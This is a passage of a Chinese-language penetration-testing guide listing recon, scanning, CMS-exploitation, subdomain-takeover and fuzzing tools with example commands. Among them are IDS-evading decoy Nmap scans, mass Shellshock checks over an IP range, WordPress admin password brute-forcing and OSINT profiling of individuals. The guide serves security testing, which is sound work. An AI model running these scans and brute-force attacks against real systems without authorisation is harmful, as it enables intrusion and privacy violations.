+<h3 id="Nmap-扫描"><a href="#Nmap-扫描" class="headerlink" title="Nmap 扫描"></a>Nmap 扫描</h3><figure class="highlight hsp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs hsp">nmap -sS -T2 -sV --<span class="hljs-keyword">randomize</span>-hosts -D <span class="hljs-keyword">RND</span>:<span class="hljs-number">10</span> example.com<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><strong>-sS</strong>：SYN 扫描（半开放扫描），侵入性较小。</li>
+<li><strong>-T2</strong>：将扫描速度设置为“礼貌”模式（polite），降低被 IDS&#x2F;IPS（入侵检测&#x2F;防御系统）发现的风险。</li>
+<li><strong>-sV</strong>：探测开放端口上的服务版本。</li>
+<li><strong>–randomize-hosts</strong>：随机化扫描主机的顺序。</li>
+<li><strong>-D RND:10</strong>：诱饵扫描（Decoy scan），通过伪造 10 个随机源 IP 来掩盖真实的扫描源。</li>
+</ul>
+<p>你也可以使用其他扫描类型，例如：</p>
+<ul>
+<li><strong>-sA</strong>：TCP ACK 扫描，用于检查端口是否被过滤（防火墙规则测试）。更多详情可以参考官方文档。</li>
+</ul>
+<h3 id="gowitness"><a href="#gowitness" class="headerlink" title="gowitness"></a>gowitness</h3><p><strong>gowitness</strong> 是一款由 Golang 编写的网站截图工具。它利用 Chrome Headless（无头浏览器）通过命令行生成 Web 界面的截图，并提供一个方便的报告查看器来处理结果。</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">扫描单个 URL 并将结果写入数据库</span><br>gowitness scan single --url &quot;https://sensepost.com&quot; --write-db<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">截取单个网站截图（简易命令）</span><br>gowitness single https://www.google.com/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 20 个线程对指定 CIDR 网段进行截图</span><br>gowitness scan --cidr 192.168.0.0/24 --threads 20<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">从 Nmap XML 文件中读取并截取所有开放的 HTTP 服务截图</span><br>gowitness nmap -f nmap.xml --open --service-contains http<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动报告服务器（用于在浏览器查看结果）</span><br>gowitness report server<br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h3 id="开源情报-OSINT"><a href="#开源情报-OSINT" class="headerlink" title="开源情报 (OSINT)"></a>开源情报 (OSINT)</h3><p>用于搜集有关用户、电子邮件和昵称的详细信息。</p>
+<ul>
+<li><strong>iKy</strong>：一款可以从电子邮件中收集信息，并以美观的视觉界面展示结果的工具。<a target="_blank" rel="noopener" href="https://kennbroorg.gitlab.io/ikyweb/">https://kennbroorg.gitlab.io/ikyweb/</a></li>
+<li><strong>Profil3r</strong>：一款 OSINT 工具，可以查找个人在社交网络上的潜在个人资料及其电子邮件地址。已从 GitHub 安装在 <code>/opt</code> 目录下的 Python 虚拟环境中。<a target="_blank" rel="noopener" href="https://github.com/amitrajputfff/Profil3r">https://github.com/amitrajputfff/Profil3r</a></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd /opt/Profil3r<br>python3 -m venv .venv<br>source .venv/bin/activate<br>python3 profil3r.py -p john doe<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>在线工具：</strong></p>
+<ul>
+<li><strong>OSINT Framework</strong>（开源情报框架）<a target="_blank" rel="noopener" href="https://osintframework.com/">https://osintframework.com/</a></li>
+<li><strong>OSINT Framework 个人汉化版&#x2F;中文替代版</strong>（针对特定地区的替代方案）<a target="_blank" rel="noopener" href="https://osintframework.pl/">https://osintframework.pl/</a></li>
+</ul>
+<h2 id="扫描与枚举-Scanning-and-Enumeration"><a href="#扫描与枚举-Scanning-and-Enumeration" class="headerlink" title="扫描与枚举 (Scanning and Enumeration)"></a>扫描与枚举 (Scanning and Enumeration)</h2><p>根据侦察阶段的结果（例如检测到的 CMS 类型、运行的服务等），我会运行其他扫描器，主要是漏洞扫描器、端口扫描器或全能型工具，以收集尽可能多的攻击向量。这一步是为了发现存活主机并与其交互，从而获取特定端口、运行服务以及软件版本的更多细节。</p>
+<p>扫描完成后，我还会进行<strong>枚举（Enumeration）</strong>，从已识别的服务中提取详细且具体的信息。其核心在于挖掘用户名、网络共享、Web 服务器路径、配置信息等。</p>
+<h3 id="ZAP-Zed-Attack-Proxy"><a href="#ZAP-Zed-Attack-Proxy" class="headerlink" title="ZAP (Zed Attack Proxy)"></a>ZAP (Zed Attack Proxy)</h3><p>在这一步中，当我开始接触 Web 应用程序时，我会运行 <strong>ZAP</strong>。它能对网站进行爬取（Crawl），并运行被动及主动扫描。你也可以使用 <strong>Burp Suite</strong> 来完成这项任务。</p>
+<hr>
+<h3 id="Nmap-进阶扫描"><a href="#Nmap-进阶扫描" class="headerlink" title="Nmap 进阶扫描"></a>Nmap 进阶扫描</h3><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 针对最常用的 1000 个 TCP 端口进行快速扫描</span><br>nmap -sV -<span class="hljs-keyword">sC </span>-O -<span class="hljs-built_in">T4</span> -oA <span class="hljs-keyword">scan </span>&lt;IP&gt; <br><br><span class="hljs-comment"># 对所有端口进行快速扫描</span><br>nmap -sV -<span class="hljs-keyword">sC </span>-O -<span class="hljs-built_in">T4</span> -p - -oA fullfastscan &lt;IP&gt; <br><br><span class="hljs-comment"># 扫描每一个 TCP 端口，以精确掌握机器上运行的服务</span><br>nmap -sV -<span class="hljs-keyword">sC </span>-O -p - -oA fullscan &lt;IP&gt; <br><br><span class="hljs-comment"># 检查最常见的 1000 个 UDP 端口是否有服务运行</span><br>nmap -sV -<span class="hljs-keyword">sC </span>-<span class="hljs-built_in">T4</span> -sU &lt;IP&gt; <br></code></pre></div></td></tr></table></figure>
+
+<p><strong>参数详解：</strong></p>
+<ul>
+<li><strong>-sC</strong>：使用默认脚本进行扫描。</li>
+<li><strong>-sV</strong>：探测服务版本信息。</li>
+<li><strong>-O</strong>：探测操作系统类型。</li>
+<li><strong>-oA</strong>：将结果以三种主要格式输出到指定文件名。</li>
+<li><strong>-T4</strong>：设置扫描强度为 4 级（侵略性快速扫描）。</li>
+</ul>
+<p>此外，我还使用 <strong>vulscan</strong>（基于 Nmap NSE 的高级漏洞扫描脚本）：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment"># 使用 vulscan 脚本进行漏洞探测</span><br>nmap -sS -sV <span class="hljs-attribute">--script</span>=vulscan example.com<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="通用漏洞扫描器"><a href="#通用漏洞扫描器" class="headerlink" title="通用漏洞扫描器"></a>通用漏洞扫描器</h3><p><strong>Nikto</strong> <a target="_blank" rel="noopener" href="https://github.com/sullo/nikto%E6%98%AF%E4%B8%80%E6%AC%BE%E7%BB%8F%E5%85%B8%E7%9A%84">https://github.com/sullo/nikto是一款经典的</a> Web 服务器漏洞扫描器，用于发现潜在的问题文件、检查过时的服务器版本以及特定的服务器配置问题。</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">nikto -host http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ -o /</span>results.html<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Skipfish</strong> <a target="_blank" rel="noopener" href="https://www.kali.org/tools/skipfish/">https://www.kali.org/tools/skipfish/</a> 可能会有人问：为什么还在用这个？这工具已经十多年没更新了。但在处理一些使用<strong>老旧技术栈</strong>的网站时，它依然非常有效。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"># -o 输出目录，-S 字典路径<br>skipfish -o output_directory -S /<span class="hljs-type">path</span>/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">dictionary</span> example.com<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Wapiti</strong> <a target="_blank" rel="noopener" href="https://github.com/wapiti-scanner/wapiti">https://github.com/wapiti-scanner/wapiti</a> 基于 Python3 的 Web 漏洞扫描器。它采用“黑盒”测试方式，不读取源码，而是像 <strong>Fuzzer（模糊测试工具）</strong> 一样工作：爬取页面、提取链接和表单，然后注入 Payload 观察是否存在错误消息或异常行为。</p>
+<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">wapiti <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//example.com/</span><br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h3 id="其他专项扫描与测试"><a href="#其他专项扫描与测试" class="headerlink" title="其他专项扫描与测试"></a>其他专项扫描与测试</h3><p><strong>SSLScan</strong> <a target="_blank" rel="noopener" href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a> 用于测试启用 SSL&#x2F;TLS 的服务，确定其支持的密码套件（Cipher Suites）及安全性。</p>
+<figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">sslscan <span class="hljs-built_in">example</span>.com<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>ShellShockHunter</strong> <a target="_blank" rel="noopener" href="https://github.com/MrCl0wnLab/ShellShockHunter">https://github.com/MrCl0wnLab/ShellShockHunter</a> 一个简单的工具，用于批量测试臭名昭著的 <strong>Shellshock</strong>（破壳）漏洞。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> main.py --range &#x27;<span class="hljs-number">194</span>.<span class="hljs-number">206</span>.<span class="hljs-number">187</span>.X,<span class="hljs-number">194</span>.<span class="hljs-number">206</span>.<span class="hljs-number">187</span>.XXX&#x27; --check --thread <span class="hljs-number">40</span> --ssl<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Bbot</strong> <a target="_blank" rel="noopener" href="https://github.com/blacklanternsecurity/bbot">https://github.com/blacklanternsecurity/bbot</a> 一款为黑客设计的递归式互联网扫描器，功能极其强大且模块化。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 扫描所有子域名端口、网页截图并输出到当前目录</span><br><span class="hljs-keyword">bbot </span>-t example.com -f <span class="hljs-keyword">subdomain-enum </span>-m nmap gowitness -n my_scan -o .<br><br><span class="hljs-comment"># 基础 Web 扫描，包含 Wappalyzer 识别、robots.txt 爬取等非侵入式操作</span><br><span class="hljs-keyword">bbot </span>-t example.com -f <span class="hljs-keyword">subdomain-enum </span>web-<span class="hljs-keyword">basic</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment"># 深度爬取目标网站（深度为 2），自动提取邮箱、敏感信息（Secrets）等</span><br><span class="hljs-keyword">bbot </span>-t www.example.com -m httpx robots <span class="hljs-keyword">badsecrets </span>secretsdb -c web_spider_distance=<span class="hljs-number">2</span> web_spider_depth=<span class="hljs-number">2</span><br><br><span class="hljs-comment"># 全面体检：子域名、邮箱、云存储桶、端口扫描、截图及 Nuclei 漏洞扫描</span><br><span class="hljs-keyword">bbot </span>-t example.com -f <span class="hljs-keyword">subdomain-enum </span>email-enum <span class="hljs-keyword">cloud-enum </span>web-<span class="hljs-keyword">basic </span>-m nmap gowitness nuclei --allow-deadly<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>WebCopilot</strong> <a target="_blank" rel="noopener" href="https://github.com/h4r5h1t/webcopilot">https://github.com/h4r5h1t/webcopilot</a> 自动化工具，先枚举子域名，然后过滤出可能存在 XSS、SQLi、Open Redirect、LFI、SSRF 和 RCE 的参数，最后进行漏洞扫描。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># -a 自动化，-b 指定后端（如 Burp Collaborator 或 InteractSH）</span><br>webcopilot -d <span class="hljs-keyword">http</span>://example.com/ -<span class="hljs-keyword">a</span> -b &lt;backend_URL&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>作为后端，我使用 Burp Collaborator <a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">https://portswigger.net/burp/documentation/collaborator</a> 或 InteractSH <a target="_blank" rel="noopener" href="https://app.interactsh.com/%E3%80%82">https://app.interactsh.com/。</a></p>
+<h3 id="CMS-扫描器-CMS-Scanners"><a href="#CMS-扫描器-CMS-Scanners" class="headerlink" title="CMS 扫描器 (CMS Scanners)"></a>CMS 扫描器 (CMS Scanners)</h3><p>用于扫描特定的 CMS 系统。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+<p><strong>Vulnx</strong> <a target="_blank" rel="noopener" href="https://github.com/anouarbensaad/vulnx">https://github.com/anouarbensaad/vulnx</a> 是一款智能机器人，能够实现自动 Shell 注入，并帮助研究人员检测 CMS 系统的安全漏洞。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">vulnx -u http:<span class="hljs-string">//example.com/</span> -w -d <span class="hljs-params">--dns</span> -o <span class="hljs-string">/test</span><br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><strong>-u</strong>：目标 URL。</li>
+<li><strong>-w</strong>：Web 信息搜集。</li>
+<li><strong>-d</strong>：子域名信息搜集。</li>
+<li><strong>–dns</strong>：DNS 信息搜集。</li>
+<li><strong>-e</strong>：进行漏洞利用（Exploiting）。</li>
+</ul>
+<hr>
+<p><strong>CMSeeK</strong>  <a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> 是一款 CMS 检测与利用套件，支持扫描 WordPress、Joomla、Drupal 以及其他 180 多种 CMS。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> cmseek.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> https://example.<span class="hljs-keyword">com</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>WPScan</strong> <a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan%EF%BC%9AWordPress">https://github.com/wpscanteam/wpscan：WordPress</a> 安全扫描器。</p>
+<p>Bash</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//example.com/</span> -e -U -o <span class="hljs-string">/wpscan</span> <span class="hljs-params">--api-token=WordPress</span> Vulnerability Database API<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><strong>–url</strong>：目标域名 URL。</li>
+<li><strong>-e</strong>：枚举（Enumeration）。</li>
+<li><strong>-U</strong>：用户列表。</li>
+<li><strong>-o</strong>：输出到文件。</li>
+<li><strong>–api-token</strong>：WordPress 漏洞数据库 API 令牌。</li>
+</ul>
+<p><strong>WpCrack</strong> <a target="_blank" rel="noopener" href="https://github.com/22XploiterCrew-Team/WpCrack%EF%BC%9A%E4%B8%80%E6%AC%BE%E5%AE%A1%E8%AE%A1%E4%B8%8E%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7%EF%BC%8C%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E6%B5%8B%E8%AF%95">https://github.com/22XploiterCrew-Team/WpCrack：一款审计与爆破工具，用于远程测试</a> WordPress 博客软件。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> WpCrack.<span class="hljs-keyword">py</span> -t http://exmaple.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">wp</span>-login.php -<span class="hljs-keyword">u</span> admin --<span class="hljs-keyword">p</span> wordlist.txt<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Joomscan</strong> <a target="_blank" rel="noopener" href="https://github.com/OWASP/joomscan%EF%BC%9AJoomla">https://github.com/OWASP/joomscan：Joomla</a> 漏洞扫描器。</p>
+<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">joomscan <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//example.com/</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>juumla</strong> <a target="_blank" rel="noopener" href="https://github.com/oppsec/juumla%EF%BC%9A%E4%B8%80%E6%AC%BE%E7%94%B1">https://github.com/oppsec/juumla：一款由</a> Python 编写的工具，用于识别 Joomla 版本、扫描漏洞及敏感文件。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">python3 <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> -u https:<span class="hljs-comment">//example.com</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>OKadminFinder</strong> <a target="_blank" rel="noopener" href="https://github.com/mIcHyAmRaNe/okadminfinder%EF%BC%9A%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86/%E7%99%BB%E5%BD%95%E9%9D%A2%E6%9D%BF%E6%9F%A5%E6%89%BE%E5%B7%A5%E5%85%B7%E3%80%82%E5%B7%B2%E4%BB%8E">https://github.com/mIcHyAmRaNe/okadminfinder：后台管理/登录面板查找工具。已从</a> GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">okadminfinder -u example<span class="hljs-selector-class">.com</span> -<span class="hljs-attribute">r</span><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="子域名-Subdomains"><a href="#子域名-Subdomains" class="headerlink" title="子域名 (Subdomains)"></a>子域名 (Subdomains)</h2><p>构建子域名列表以扩大攻击范围，或者在可能的情况下尝试接管（Takeover）它们。</p>
+<p><strong>Subfinder</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/subfinder%EF%BC%9A%E5%BF%AB%E9%80%9F%E7%9A%84%E8%A2%AB%E5%8A%A8%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7%E3%80%82">https://github.com/projectdiscovery/subfinder：快速的被动子域名枚举工具。</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">subfinder -d example.<span class="hljs-keyword">com</span> -v -<span class="hljs-keyword">all</span> -<span class="hljs-keyword">o</span> subdomains.txt<br></code></pre></div></td></tr></table></figure>
+
+<p>为了获得更好的结果，建议配置 API。</p>
+<p><strong>Knock</strong> <a target="_blank" rel="noopener" href="https://github.com/guelfoweb/knock%EF%BC%9A%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%82%E5%B7%B2%E4%BB%8E">https://github.com/guelfoweb/knock：子域名扫描工具。已从</a> GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 扫描并保存报告</span><br><span class="hljs-string">knockpy</span> -<span class="hljs-string">d</span> <span class="hljs-string">example</span>.<span class="hljs-string">com</span> <span class="hljs-built_in">--recon</span> <span class="hljs-built_in">--bruteforce</span> <span class="hljs-built_in">--save</span> <span class="hljs-string">report</span><br><span class="hljs-comment"># 查看生成的报告内容</span><br><span class="hljs-string">knockpy</span> <span class="hljs-built_in">--report</span> <span class="hljs-string">example</span>.<span class="hljs-string">com_yyyy_aa_dd_hh_mm_ss</span>.<span class="hljs-string">json</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Bbot</strong> <a target="_blank" rel="noopener" href="https://github.com/blacklanternsecurity/bbot%EF%BC%9A%E4%B8%93%E4%B8%BA%E9%BB%91%E5%AE%A2%E8%AE%BE%E8%AE%A1%E7%9A%84%E9%80%92%E5%BD%92%E5%BC%8F%E4%BA%92%E8%81%94%E7%BD%91%E6%89%AB%E6%8F%8F%E5%99%A8%E3%80%82%E5%B7%B2%E4%BB%8E">https://github.com/blacklanternsecurity/bbot：专为黑客设计的递归式互联网扫描器。已从</a> GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 执行子域名枚举</span><br><span class="hljs-keyword">bbot </span>-t example.com -f <span class="hljs-keyword">subdomain-enum</span><br><span class="hljs-keyword"></span><span class="hljs-comment"># 对目标执行仅限被动模式的子域名枚举</span><br><span class="hljs-keyword">bbot </span>-t example.com -f <span class="hljs-keyword">subdomain-enum </span>-rf passive<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>dnsReaper</strong> <a target="_blank" rel="noopener" href="https://github.com/punk-security/dnsReaper%EF%BC%9A%E9%9D%A2%E5%90%91%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%B7%A5%E5%85%B7%E3%80%82%E5%B7%B2%E4%BB%8E">https://github.com/punk-security/dnsReaper：面向攻击者的子域名接管工具。已从</a> GitHub 安装在 <code>/opt</code> 目录下，并配置为 Python 虚拟环境。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> <span class="hljs-attr">--domain</span> example.com<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Subzy</strong> <a target="_blank" rel="noopener" href="https://github.com/PentestPad/subzy%EF%BC%9A%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E3%80%82%E5%8F%AF%E4%BB%A5%E5%85%88%E4%BD%BF%E7%94%A8">https://github.com/PentestPad/subzy：子域名接管漏洞检测工具。可以先使用</a> Subfinder 或 Bbot 手动生成列表，然后将其作为目标添加至 Subzy 中。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">./subzy <span class="hljs-built_in">run</span> <span class="hljs-comment">--targets subdomains.txt</span><br></code></pre></div></td></tr></table></figure>
+
+<p>你可能也会对我之前关于“子域名接管任务”的文章感兴趣。</p>
+<h2 id="模糊测试与暴力破解-Fuzzing-and-Bruteforcing"><a href="#模糊测试与暴力破解-Fuzzing-and-Bruteforcing" class="headerlink" title="模糊测试与暴力破解 (Fuzzing and Bruteforcing)"></a>模糊测试与暴力破解 (Fuzzing and Bruteforcing)</h2><p>对于任何涉及字典的工具，我都会使用 <strong>SecLists</strong> <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists%E3%80%81**fuzzdb">https://github.com/danielmiessler/SecLists、**fuzzdb</a> <strong><a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb%E3%80%81">https://github.com/fuzzdb-project/fuzzdb、</a></strong>Combined-Wordlists** <a target="_blank" rel="noopener" href="https://github.com/0xspade/Combined-Wordlists%E4%BB%A5%E5%8F%8A">https://github.com/0xspade/Combined-Wordlists以及</a> <strong>web-fuzz-wordlists</strong> <a target="_blank" rel="noopener" href="https://github.com/kaimi-io/web-fuzz-wordlists%E3%80%82%E4%B8%8B%E6%96%87%E6%8F%8F%E8%BF%B0%E7%9A%84%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%93%8D%E4%BD%9C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%9C%A8">https://github.com/kaimi-io/web-fuzz-wordlists。下文描述的大多数操作也可以在</a> ZAP 中使用相同的字典来完成。</p>
+<p><strong>Ffuf</strong> <a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf%EF%BC%9A%E7%94%A8">https://github.com/ffuf/ffuf：用</a> Go 编写的快速 Web 模糊测试工具，主要用于目录或文件发现。</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment"># 目录/文件发现</span><br>ffuf -w <span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/wordlist -u https:/</span><span class="hljs-regexp">/example.com/</span>FUZZ<br><br><span class="hljs-comment"># 虚拟主机（VHost）枚举，并过滤掉大小为 4242 的响应</span><br>ffuf -w <span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/vhost/</span>wordlist -u https:<span class="hljs-regexp">//</span>example.com -H <span class="hljs-string">&quot;Host: FUZZ&quot;</span> -fs <span class="hljs-number">4242</span><br><br><span class="hljs-comment"># 参数（Parameter）模糊测试</span><br>ffuf -w <span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/paramnames.txt -u https:/</span><span class="hljs-regexp">/example.com/</span>script.php?FUZZ=test_value -fs <span class="hljs-number">4242</span><br></code></pre></div></td></tr></table></figure>
+
+<p>我使用 <strong>Crunch</strong> <a target="_blank" rel="noopener" href="https://github.com/jim3ma/crunch%E3%80%81**CeWL">https://github.com/jim3ma/crunch、**CeWL</a> <strong><a target="_blank" rel="noopener" href="https://github.com/digininja/CeWL%E3%80%81">https://github.com/digininja/CeWL、</a></strong>bopscrk**  <a target="_blank" rel="noopener" href="https://github.com/r3nt0n/bopscrk">https://github.com/r3nt0n/bopscrk</a>	和 <strong>web-wordlist-generator</strong> <a target="_blank" rel="noopener" href="https://github.com/OsmanKandemir/web-wordlist-generator%EF%BC%88%E4%BD%9C%E4%B8%BA">https://github.com/OsmanKandemir/web-wordlist-generator（作为</a> Python 虚拟环境）来生成自定义字典。</p>
